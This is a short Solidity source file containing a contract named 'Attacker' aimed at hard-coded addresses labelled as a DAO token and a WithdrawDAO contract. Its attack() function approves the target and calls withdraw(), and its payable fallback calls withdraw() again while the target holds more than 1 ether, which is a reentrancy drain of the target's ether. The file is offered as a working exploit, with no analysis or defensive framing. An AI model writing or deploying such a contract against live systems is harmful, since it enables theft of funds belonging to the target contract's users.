pragma solidity ^0.4.25;
contract DAO {
    function balanceOf(address addr) public returns (uint);
    function transferFrom(address from, address to, uint balance) public returns (bool);
    function approve(address _spender, uint256 _amount) public returns (bool success);
    uint public totalSupply;
}

contract WithdrawDAO {
    function withdraw() public;
}

contract Attacker {
    DAO public dao = DAO(0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413);
    address public owner;
    WithdrawDAO public target = WithdrawDAO(0xBf4eD7b27F1d666546E30D74d50d173d20bca754);

    constructor() public {
    owner = msg.sender;
    }

    function depositEth() public payable {
        require(msg.sender == owner, "Only the owner can deposit ETH.");
    }

    function withdrawAllEth() public {
        require(msg.sender == owner, "Only the owner can withdraw ETH.");
        owner.transfer(address(this).balance);
    }

    function depositDAO(uint256 amount) public {
        dao.transferFrom(msg.sender, address(this), amount);
    }

    function attack() public {
        require(msg.sender == owner, "Only the owner can initiate the attack.");

        uint256 balance = dao.balanceOf(address(this));

        dao.approve(address(target), balance);

        target.withdraw();
    }

    function() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }
}